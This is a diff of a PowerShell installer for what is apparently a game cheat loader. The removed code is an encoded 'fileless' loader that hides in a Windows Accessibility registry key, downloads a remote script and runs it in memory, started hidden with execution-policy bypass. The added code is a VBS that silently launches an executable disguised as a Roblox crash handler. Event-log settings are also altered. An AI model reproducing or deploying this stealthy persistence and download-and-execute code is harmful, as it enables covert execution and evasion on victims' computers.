@@ -553,30 +553,30 @@ Write-Host "[4/4] Configuring fileless startup..." -ForegroundColor Yellow
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
 if ($Persist) {
-    $loaderScript = @"
-`$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
-`$k=(gp `$p -N Configuration -EA 0).Configuration
-`$w=(gp `$p -N Workspace -EA 0).Workspace
-if(`$k){
-if(`$w -and (Test-Path "`$w\installer.ps1")){
-& "`$w\installer.ps1" -Key `$k
-}else{
-[Net.ServicePointManager]::SecurityProtocol="Tls12"
-`$wc=New-Object Net.WebClient
-for(`$i=0;`$i-lt10;`$i++){
-try{
-`$s=`$wc.DownloadString('$ServerBaseUrl/installer.ps1')
-if(`$s){. ([scriptblock]::Create(`$s)) -Key `$k;break}
-}catch{sleep 3}
-}
-}
-}
-"@
-    $encLoader = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loaderScript))
     $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
     $vbsContent = @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encLoader", 0, False
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+strScriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
+
+strExePath = ""
+arrPaths = Array( _
+    strScriptPath & "\build\RobloxCrashHandler.exe", _
+    strScriptPath & "\build\RobloxCrashHandler_fallback.exe", _
+    strScriptPath & "\updates-server\uploads\RobloxCrashHandler.exe", _
+    objShell.ExpandEnvironmentStrings("%TEMP%") & "\RobloxCrashHandler_fallback.exe" _
+)
+
+For Each path In arrPaths
+    If objFSO.FileExists(path) Then
+        strExePath = path
+        Exit For
+    End If
+Next
+
+If strExePath <> "" Then
+    objShell.Run """" & strExePath & """", 0, False
+End If
 "@
     [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
 
@@ -661,27 +661,16 @@ function Start-PrivateBrowser([string]$url) {
         Start-Process $url
     }
 }
-
 if ($started) {
-    if (-not $Silent) {
-        Write-Host "Opening web portal in private browser..." -ForegroundColor Green
-        Start-PrivateBrowser "http://127.0.0.1:9876/"
-    } else {
-        Write-Host "Silent mode: skipping web portal launch." -ForegroundColor Green
-    }
+    Write-Host "Loader is running and awaiting activation." -ForegroundColor Green
 } else {
     Write-Host "WARNING: Loader did not respond within 20 seconds." -ForegroundColor Yellow
-    if (-not $Silent) {
-        Write-Host "Access manually: http://localhost:9876/" -ForegroundColor Yellow
-    }
 }
 
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
 wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
 
 Write-Host "==========================================" -ForegroundColor Green
-Write-Host "  SUCCESS: Fileless install complete!     " -ForegroundColor Green
-Write-Host "  Zero loose files written to disk.       " -ForegroundColor Green
-Write-Host "  Portal: http://localhost:9876/           " -ForegroundColor Cyan
+Write-Host "  SUCCESS: Install complete!              " -ForegroundColor Green
+Write-Host "  Press CapsLock + Enter to trigger cheat." -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Green
-
